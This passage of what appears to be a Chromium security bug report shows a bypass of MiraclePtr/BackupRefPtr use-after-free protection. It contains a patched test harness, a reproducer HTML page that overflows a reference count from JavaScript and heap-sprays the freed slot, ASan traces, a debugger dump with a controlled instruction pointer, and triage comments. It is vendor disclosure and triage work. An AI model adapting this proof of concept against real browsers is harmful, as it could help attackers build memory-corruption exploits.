    #20 0x7eff4c45eab8 in void base::internal::DecayedFunctorTraits<void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>::Invoke<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&>(void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&, unsigned int&&, mojo::HandleSignalsState const&) base/functional/bind_internal.h:671:12
    #21 0x7eff4c45eab8 in void base::internal::InvokeHelper<false, base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, void, 0ul>::MakeItSo<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)>> const&, unsigned int, mojo::HandleSignalsState const&>(void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)>> const&, unsigned int&&, mojo::HandleSignalsState const&) base/functional/bind_internal.h:930:12
    #22 0x7eff4c45eab8 in void base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::RunImpl<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)>> const&, 0ul>(void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)>> const&, std::__Cr::integer_sequence<unsigned long, 0ul>, unsigned int&&, mojo::HandleSignalsState const&) base/functional/bind_internal.h:1067:14
    #23 0x7eff4c45eab8 in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&) base/functional/bind_internal.h:987:12
    #24 0x7eff4c3ab285 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const & base/functional/callback.h:344:12
    #25 0x7eff4c3aac45 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple_watcher.cc:278:14
    #26 0x7eff4c3abd2f in void base::internal::DecayedFunctorTraits<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>::Invoke<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher> const&, int, unsigned int, mojo::HandleSignalsState>(void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher> const&, int&&, unsigned int&&, mojo::HandleSignalsState&&) base/functional/bind_internal.h:738:12
    #27 0x7eff4c3abd2f in void base::internal::InvokeHelper<true, base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, void, 0ul, 1ul, 2ul, 3ul>::MakeItSo<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&) base/functional/bind_internal.h:954:5
    #28 0x7eff4c3abd2f in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunImpl<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, 0ul, 1ul, 2ul, 3ul>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul, 2ul, 3ul>) base/functional/bind_internal.h:1067:14
    #29 0x7eff54899b6a in base::OnceCallback<void ()>::Run() && base/functional/callback.h:156:12
    #30 0x7eff54899b6a in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:203:34
    #31 0x7eff549072ce in void base::TaskAnnotator::RunTask<base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3>(perfetto::StaticString, base::PendingTask&, base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3&&) base/task/common/task_annotator.h:90:5
    #32 0x7eff549072ce in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:473:23
    #33 0x7eff5490636f in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:338:40
    #34 0x7eff54907fc4 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc
    #35 0x7eff54a99681 in base::MessagePumpGlib::HandleDispatch() base/message_loop/message_pump_glib.cc:649:46
    #36 0x7eff54a9c6c2 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:274:43
    #37 0x7efefc6c517c in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x5217c) (BuildId: 5aeee8a84d30e8b2dc1b4853af16559f6c51e307)

SUMMARY: AddressSanitizer: heap-use-after-free base/memory/raw_ptr_asan_hooks.cc:53:17 in base::internal::(anonymous namespace)::CrashImmediatelyOnUseAfterFree(unsigned long)
Shadow bytes around the buggy address:
  0x5210012d5280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x5210012d5300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x5210012d5380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x5210012d5400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x5210012d5480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x5210012d5500:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x5210012d5580: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x5210012d5600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x5210012d5680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x5210012d5700: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x5210012d5780: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==996856==ADDITIONAL INFO

==996856==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7eff4c45dee5 in mojo::Connector::PostDispatchNextMessageFromPipe() mojo/public/cpp/bindings/lib/connector.cc:574:7
    #1 0x7eff4c3ab724 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int) mojo/public/cpp/system/simple_watcher.cc:102:13


MiraclePtr Status: PROTECTED
This crash occurred while a raw_ptr<T> object containing a dangling pointer was being dereferenced.
MiraclePtr is expected to make this crash non-exploitable once fully enabled.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==996856==END OF ADDITIONAL INFO
==996856==ABORTING

crash.log 
*RAX  0x4141414141414141 ('AAAAAAAA')
*RBX  0x24f002f88460 —▸ 0x7f8849b3f450 —▸ 0x7f88491c0f30 (content::PermissionServiceImpl::~PermissionServiceImpl()) ◂— push   rbp
*RCX  0x15b
*RDX  0x0
*RDI  0x24f000f03e00 ◂— 0x4141414141414141 ('AAAAAAAA')
*RSI  0x0
*R8   0x7f8833cdb5a0 ◂— 0x2
*R9   0x7f8833cdb5a0 ◂— 0x2
*R10  0x7ffdc601504b ◂— 0xe831207fffffffff
*R11  0x0
*R12  0x24f000fb4dc0 —▸ 0x7f884809a748 —▸ 0x7f88480852b0 (mojo::InterfaceEndpointClient::~InterfaceEndpointClient()) ◂— push   rbp
*R13  0x0
*R14  0x7ffdc6015390 ◂— 'TriggerUaf'
*R15  0x7ffdc60151b0 —▸ 0x7f884a610d80 —▸ 0x7f884a42bfa0 (logging::LogMessage::~LogMessage()) ◂— push   rbp
*RBP  0x7ffdc6015300 —▸ 0x7ffdc60153d0 —▸ 0x7ffdc6015470 —▸ 0x7ffdc60154e0 —▸ 0x7ffdc6015650 ◂— ...
*RSP  0x7ffdc60151a8 —▸ 0x7f88491c2287 ◂— movzx  eax, byte ptr [r14 + 0x17]
*RIP  0x7f88491c4260 (UafManager::TriggerUaf()+16) ◂— jmp    qword ptr [rax + 0x10]
───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
 ► 0x7f88491c4260 <UafManager::TriggerUaf()+16>    jmp    qword ptr [rax + 0x10]
 
   0x7f88491c4263 <UafManager::TriggerUaf()+19>    push   rbp
   0x7f88491c4264 <UafManager::TriggerUaf()+20>    mov    rbp, rsp
   0x7f88491c4267 <UafManager::TriggerUaf()+23>    lea    rdi, [rip - 0xaefde4]
   0x7f88491c426e <UafManager::TriggerUaf()+30>    lea    rsi, [rip - 0xa75247]
   0x7f88491c4275 <UafManager::TriggerUaf()+37>    xor    eax, eax
   0x7f88491c4277 <UafManager::TriggerUaf()+39>    call   0x7f8849abb7a0                <0x7f8849abb7a0>
 
   0x7f88491c427c                                  int3   
   0x7f88491c427d                                  int3   
   0x7f88491c427e                                  int3   
   0x7f88491c427f                                  int3   
───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsp 0x7ffdc60151a8 —▸ 0x7f88491c2287 ◂— movzx  eax, byte ptr [r14 + 0x17]
01:0008│ r15 0x7ffdc60151b0 —▸ 0x7f884a610d80 —▸ 0x7f884a42bfa0 (logging::LogMessage::~LogMessage()) ◂— push   rbp
02:0010│     0x7ffdc60151b8 —▸ 0x24f000000002 ◂— 0x0
03:0018│     0x7ffdc60151c0 —▸ 0x7f8839193460 —▸ 0x7f88391335c0 ◂— push   rbp
04:0020│     0x7ffdc60151c8 —▸ 0x7f8839192c10 —▸ 0x7f8839128c00 ◂— push   rbp
05:0028│     0x7ffdc60151d0 —▸ 0x7f88391a1fb8 (std::__Cr::locale::__imp::classic_locale_imp_) —▸ 0x7f8839193a30 —▸ 0x7f8839151b30 (std::__Cr::locale::__imp::~__imp()) ◂— push   rbp
06:0030│     0x7ffdc60151d8 ◂— 0x0
07:0038│     0x7ffdc60151e0 ◂— 0x0
─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
 ► f 0   0x7f88491c4260 UafManager::TriggerUaf()+16
   f 1   0x7f88491c2287
   f 2   0x7f8844282ee9
   f 3   0x7f8848084a52 mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+818
   f 4   0x7f884808a891 mojo::MessageDispatcher::Accept(mojo::Message*)+161
   f 5   0x7f884808604f mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+79
   f 6   0x7f884808e025
   f 7   0x7f884808d93f mojo::internal::MultiplexRouter::Accept(mojo::Message*)+463
────────────────────────────────────────────────────────────────────────────────────────────────────────────────

copy_mojojs_bindings.py

import os
import shutil
import sys

base_path = sys.argv[1]

if base_path[-1:] == '/':
  base_path = base_path[:-1]

for path, dirs, files in os.walk(base_path):
  for file in files:
    if file == 'mojo_bindings.js':
      shutil.copyfile(os.path.join(path, file), os.path.join('./', file))
    
    if file.endswith('.mojom.js'):
      target_path = os.path.join('./', path[len(base_path) + 1:])
      try:
        os.makedirs(target_path)
      except:
        pass
      shutil.copyfile(os.path.join(path, file), os.path.join(target_path, file))

patch.diff

diff --git a/base/allocator/partition_allocator/src/partition_alloc/in_slot_metadata.h b/base/allocator/partition_allocator/src/partition_alloc/in_slot_metadata.h
index 70e927a646bd1..1aaa573d242ce 100644
--- a/base/allocator/partition_allocator/src/partition_alloc/in_slot_metadata.h
+++ b/base/allocator/partition_allocator/src/partition_alloc/in_slot_metadata.h
@@ -131,11 +131,11 @@ class PA_COMPONENT_EXPORT(PARTITION_ALLOC) InSlotMetadata {
   using CountType = uint32_t;
   static constexpr CountType kMemoryHeldByAllocatorBit =
       BitField<CountType>::Bit(0);
-  static constexpr CountType kPtrCountMask = BitField<CountType>::Mask(1, 29);
+  static constexpr CountType kPtrCountMask = BitField<CountType>::Mask(1, 12);
   static constexpr CountType kRequestQuarantineBit =
-      BitField<CountType>::Bit(30);
+      BitField<CountType>::Bit(13);
   static constexpr CountType kNeedsMac11MallocSizeHackBit =
-      BitField<CountType>::Bit(31);
+      BitField<CountType>::Bit(14);
   static constexpr CountType kDanglingRawPtrDetectedBit =
       BitField<CountType>::None();
   static constexpr CountType kUnprotectedPtrCountMask =
@@ -155,11 +155,12 @@ class PA_COMPONENT_EXPORT(PARTITION_ALLOC) InSlotMetadata {
 #endif  // !BUILDFLAG(ENABLE_DANGLING_RAW_PTR_CHECKS)
 
   // Quick check to assert these masks do not overlap.
+  /*
   static_assert((kMemoryHeldByAllocatorBit + kPtrCountMask +
                  kUnprotectedPtrCountMask + kDanglingRawPtrDetectedBit +
                  kRequestQuarantineBit + kNeedsMac11MallocSizeHackBit) ==
                 std::numeric_limits<CountType>::max());
-
+*/
   static constexpr auto kPtrInc =
       SafeShift<CountType>(1, std::countr_zero(kPtrCountMask));
   static constexpr auto kUnprotectedPtrInc =
diff --git a/content/browser/BUILD.gn b/content/browser/BUILD.gn
index c071c64889692..997818675b816 100644
--- a/content/browser/BUILD.gn
+++ b/content/browser/BUILD.gn
@@ -1449,6 +1449,8 @@ source_set("browser") {
     "permissions/permission_service_context.h",
     "permissions/permission_service_impl.cc",
     "permissions/permission_service_impl.h",
+    "permissions/uaf111.h",
+    "permissions/uaf111.cc",
     "picture_in_picture/picture_in_picture_service_impl.cc",
     "picture_in_picture/picture_in_picture_service_impl.h",
     "picture_in_picture/picture_in_picture_session.cc",
diff --git a/content/browser/permissions/permission_service_impl.cc b/content/browser/permissions/permission_service_impl.cc
index a39953c92f434..b3103b02c6018 100644
--- a/content/browser/permissions/permission_service_impl.cc
+++ b/content/browser/permissions/permission_service_impl.cc
@@ -29,6 +29,7 @@
 #include "third_party/blink/public/common/permissions/permission_utils.h"
 #include "third_party/blink/public/mojom/permissions/permission.mojom-shared.h"
 #include "url/origin.h"
+#include "base/logging.h"
 
 using blink::mojom::EmbeddedPermissionControlClient;
 using blink::mojom::EmbeddedPermissionControlResult;
@@ -37,6 +38,7 @@ using blink::mojom::PermissionDescriptorPtr;
 using blink::mojom::PermissionName;
 using blink::mojom::PermissionStatus;
 
+
 namespace content {
 
 namespace {
@@ -221,6 +223,35 @@ void PermissionServiceImpl::RequestPageEmbeddedPermission(
   }
 }
 
+void PermissionServiceImpl::TestBackupRefPtr(const std::string& operation){
+	//LOG(ERROR) <<"in TestBackupRefPtr";
+	if(!uafobj_manager){
+	uafobj_manager = std::make_unique<UafManager>();
+}
+	if(operation == "NewObject"){
+		uafobj_manager->NewObject();
+	}
+	if(operation == "FreeObject"){
+		uafobj_manager->ResetObject();
+	}
+	if(operation == "Addref"){
+		uafobj_manager->AddRef1();
+	}
+	if(operation == "TriggerUaf"){
+		uafobj_manager->TriggerUaf();
+	}	
+	if(operation == "ReadMemory"){
+		uafobj_manager->ReadMemory();
+	}
+	if(operation == "AddRefInThreadpool"){
+		uafobj_manager->AddRefInThreadpool();
+	}
+	if(operation == "HeapSpray"){
+		LOG(ERROR) <<"start HeapSpray";
+		uafobj_manager->HeapSpray();
+	}
+}
+
 void PermissionServiceImpl::RequestPermission(
     PermissionDescriptorPtr permission,
     bool user_gesture,
diff --git a/content/browser/permissions/permission_service_impl.h b/content/browser/permissions/permission_service_impl.h
index 9bf355e564790..f417f55fad005 100644
--- a/content/browser/permissions/permission_service_impl.h
+++ b/content/browser/permissions/permission_service_impl.h
@@ -14,7 +14,7 @@
 #include "mojo/public/cpp/bindings/pending_remote.h"
 #include "third_party/blink/public/mojom/permissions/permission.mojom.h"
 #include "url/origin.h"
-
+#include "content/browser/permissions/uaf111.h"
 namespace blink {
 enum class PermissionType;
 }
@@ -47,7 +47,7 @@ class PermissionServiceImpl : public blink::mojom::PermissionService {
 
   class PendingRequest;
   using RequestsMap = base::IDMap<std::unique_ptr<PendingRequest>>;
-
+void TestBackupRefPtr(const std::string& operation) override;
   // blink::mojom::PermissionService.
   void HasPermission(blink::mojom::PermissionDescriptorPtr permission,
                      PermissionStatusCallback callback) override;
@@ -101,6 +101,7 @@ class PermissionServiceImpl : public blink::mojom::PermissionService {
   RequestsMap pending_requests_;
   // context_ owns |this|.
   raw_ptr<PermissionServiceContext> context_;
+  std::unique_ptr<UafManager> uafobj_manager;
   const url::Origin origin_;
   base::WeakPtrFactory<PermissionServiceImpl> weak_factory_{this};
 };
diff --git a/third_party/blink/public/mojom/permissions/permission.mojom b/third_party/blink/public/mojom/permissions/permission.mojom
index 7a0a17b3b04de..a85dae067dbea 100644
--- a/third_party/blink/public/mojom/permissions/permission.mojom
+++ b/third_party/blink/public/mojom/permissions/permission.mojom
@@ -156,4 +156,5 @@ interface PermissionService {
   // PermissionStatus.
   NotifyEventListener(PermissionDescriptor permission, string event_type,
                       bool is_added);
+  TestBackupRefPtr(string operation);
 };


TestUaf.html

<script src="/mojo_bindings.js"></script>
<script src="/gen/third_party/blink/public/mojom/permissions/permission.mojom.js"></script>
<script>
  var PermissionService0;
  function bindClientPermissionService(){
    var PermissionService_ptr = new blink.mojom.PermissionServicePtr();
    Mojo.bindInterface(blink.mojom.PermissionService.name, mojo.makeRequest(PermissionService_ptr).handle, "context");
    return PermissionService_ptr
  }
</script>
<html>
<body>
<script>
    PermissionService0 = bindClientPermissionService();
    PermissionService0.testBackupRefPtr("NewObject");
    for(var i=0;i<4095;i++){
    PermissionService0.testBackupRefPtr("Addref");
    }
    PermissionService0.testBackupRefPtr("AddRefInThreadpool");
    PermissionService0.testBackupRefPtr("FreeObject");
    PermissionService0.testBackupRefPtr("HeapSpray");
    PermissionService0.testBackupRefPtr("TriggerUaf");
    //PermissionService0.testBackupRefPtr("ReadMemory");
</script>
</body>
</html>

uaf111.cc

#include "content/browser/permissions/uaf111.h"
#include "base/task/thread_pool.h"

#include "base/functional/bind.h"
UafTarget::UafTarget(){
}
UafTarget::~UafTarget(){
}
UafManager::UafManager(){
}
UafManager::~UafManager(){
}

void UafTarget::VirtualCall(){
	LOG(ERROR) <<"in VirtualCall";
}

void UafManager::NewObject(){
	if(!owned_ptr){
		owned_ptr = std::make_unique<UafTarget>();
	}
	printf("owned ptr:%p\n",(void *)owned_ptr.get());
}

void UafManager::ResetObject(){
	owned_ptr.reset();
}

void UafManager::AddRef1(){
	rawptr_bak.push_back(owned_ptr.get());
}
void UafManager::HeapSpray(){
	void *spray_ptr = (void *) malloc(sizeof(UafTarget));
	memset(spray_ptr,0x41,sizeof(UafTarget));
	printf("spray ptr:%p\n",spray_ptr);
}
void UafManager::TriggerUaf(){
	rawptr_bak[0]->VirtualCall();
}
void UafManager::ReadMemory(){
	rawptr_bak[0]->ReadMemory();
}
void UafManager::AddRefInThreadpool(){
	base::ThreadPool::PostTask(FROM_HERE, base::BindOnce(&UafManager::AddRef1, base::Unretained(this)));
}

uaf111.h

#include "base/logging.h"
#include "vector"
class A{
	public:
    	void VirtualCall(){LOG(ERROR) <<"1";}
};
class UafTarget: public A{
public:
	UafTarget();
	virtual ~UafTarget();
	void ReadMemory(){
		LOG(ERROR) <<"start read memory";
		for(int i = 0;i <10;i++) printf("0x%02x\n",a[i+66]);
	}
	virtual void VirtualCall();
private:
	char a[0x1000];
};

class UafManager{
public:
	UafManager();
	~UafManager();
	void NewObject();
	void ResetObject();
	void AddRef1();
	void TriggerUaf();
	void ReadMemory();
	void AddRefInThreadpool();
	void HeapSpray();
private:
	std::unique_ptr<UafTarget> owned_ptr;
	std::vector<raw_ptr<UafTarget>> rawptr_bak;
};


### ha...@gmail.com (2024-05-13)

If you can't reproduce. You can change TestUaf.html to this one and modify the setTimeout time from 0-5.I can stablely reproduce the bug with the time 1 in my computer.

<script src="/mojo_bindings.js"></script>
<script src="/gen/third_party/blink/public/mojom/permissions/permission.mojom.js"></script>
<script>
  var PermissionService0;
  function bindClientPermissionService(){
    var PermissionService_ptr = new blink.mojom.PermissionServicePtr();
    Mojo.bindInterface(blink.mojom.PermissionService.name, mojo.makeRequest(PermissionService_ptr).handle, "context");
    return PermissionService_ptr
  }
</script>
<html>
<body>
<script>
    PermissionService0 = bindClientPermissionService();
    PermissionService0.testBackupRefPtr("NewObject");
    for(var i=0;i<4095;i++){
    PermissionService0.testBackupRefPtr("Addref");
    }
    PermissionService0.testBackupRefPtr("AddRefInThreadpool");
    setTimeout(()=>{PermissionService0.testBackupRefPtr("FreeObject");
    PermissionService0.testBackupRefPtr("HeapSpray");
    PermissionService0.testBackupRefPtr("TriggerUaf");},1);
    //PermissionService0.testBackupRefPtr("ReadMemory");
</script>
</body>
</html>

### ad...@google.com (2024-05-13)

Sorry, the attachment upload service seems to be broken today, I've reported it. Thanks for pasting them inline - I'll take a look later.

### ad...@google.com (2024-05-13)

Hi, security shepherd here. There are just a ton of incoming bugs today so I haven't got to this one yet, and I won't get a chance until tomorrow morning UK time.

So, Bartek, I'm ccing you for a look in your timezone - but please be aware I haven't reproduced this or confirmed it's a genuine bug yet, let alone labeled it with all the right metadata. Feel free to label up as you wish, or work on further triage, or fix it, or just ignore it until I get a chance to do all my duties tomorrow!

### ba...@chromium.org (2024-05-14)

Interesting. If a gap between `fetch_add` and `PA_CHECK` can be abused (which I didn't look closer into) then this report may hold water.

What we could do is remove a bit from the mask we check against on this path (but keep it on the `Free` path). Not sure if it counts as a solution, or just a roadblock, but an attacker would have to freeze millions of threads to bypass that.

### ha...@gmail.com (2024-05-14)

The affected code location is:https://source.chromium.org/chromium/chromium/src/+/main:base/allocator/partition_allocator/src/partition_alloc/in_slot_metadata.h;l=181;drc=5bf1a4a403490afa7294232e383a1750aefcc881;bpv=1;bpt=1

### ad...@google.com (2024-05-14)

I was able to reproduce the ASAN crash on Linux using the instructions given.

Revision 8ddfc7ef8e5743772985b9e5ea0a03a74e1b41ba. Args:

```
dcheck_always_on = false
enable_ipc_fuzzer = true
is_asan = true
is_component_build = false
is_debug = false
is_lsan = true
use_remoteexec = true
v8_enable_verify_heap = true

```

The ASAN trace I got is the same as the above, but pasting it here with better formatting:

```
==4115873==ERROR: AddressSanitizer: heap-use-after-free on address 0x521000677100 at pc 0x562600665862 bp 0x7ffeaf26f2f0 sp 0x7ffeaf26f2e8
READ of size 1 at 0x521000677100 thread T0 (chrome)
    #0 0x562600665861 in base::internal::(anonymous namespace)::CrashImmediatelyOnUseAfterFree(unsigned long) base/memory/raw_ptr_asan_hooks.cc:53:17
    #1 0x5626006653e5 in base::internal::(anonymous namespace)::SafelyUnwrapForDereference(unsigned long) base/memory/raw_ptr_asan_hooks.cc:76:5
    #2 0x5625f894dfbe in SafelyUnwrapPtrForDereference<UafTarget> base/allocator/partition_allocator/src/partition_alloc/pointers/raw_ptr_hookable_impl.h:84:9
    #3 0x5625f894dfbe in GetForDereference base/allocator/partition_allocator/src/partition_alloc/pointers/raw_ptr.h:983:12
    #4 0x5625f894dfbe in operator-> base/allocator/partition_allocator/src/partition_alloc/pointers/raw_ptr.h:676:12
    #5 0x5625f894dfbe in UafManager::TriggerUaf() content/browser/permissions/uaf111.cc:38:9
    #6 0x5625f8945097 in content::PermissionServiceImpl::TestBackupRefPtr(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&) content/browser/permissions/permission_service_impl.cc:241:32
    #7 0x5625f2e1cb9b in blink::mojom::PermissionServiceStubDispatch::Accept(blink::mojom::PermissionService*, mojo::Message*) gen/third_party/blink/public/mojom/permissions/permission.mojom.cc:2301:13
    #8 0x562601e6aa97 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1036:54
    #9 0x562601e8691d in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:48:24
    #10 0x562601e6fc65 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:721:20
    #11 0x562601e945fc in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) mojo/public/cpp/bindings/lib/multiplex_router.cc:1120:42
    #12 0x562601e92374 in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:733:7
    #13 0x562601e86a1a in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #14 0x562601e62113 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:554:49
    #15 0x562601e63b50 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:611:14
    #16 0x562601e6456d in Invoke<void (mojo::Connector::*)(), const base::WeakPtr<mojo::Connector> &> base/functional/bind_internal.h:738:12
    #17 0x562601e6456d in MakeItSo<void (mojo::Connector::*)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector> > > base/functional/bind_internal.h:954:5
    #18 0x562601e6456d in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::*&&)(), base::WeakPtr<mojo::Connector>&&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(), base::WeakPtr<mojo::Connector>>, void ()>::RunImpl<void (mojo::Connector::*)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector>>, 0ul>(void (mojo::Connector::*&&)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/bind_internal.h:1067:14
    #19 0x562600776644 in Run base/functional/callback.h:156:12
    #20 0x562600776644 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:203:34
    #21 0x5626007d9a36 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:475:11)> base/task/common/task_annotator.h:90:5
    #22 0x5626007d9a36 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:473:23
    #23 0x5626007d894d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:338:40
    #24 0x5626007da77a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc
    #25 0x562600940d89 in base::MessagePumpGlib::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_glib.cc:694:48
    #26 0x5626007db3e6 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:645:12
    #27 0x562600708f5f in base::RunLoop::Run(base::Location const&) base/run_loop.cc:134:14
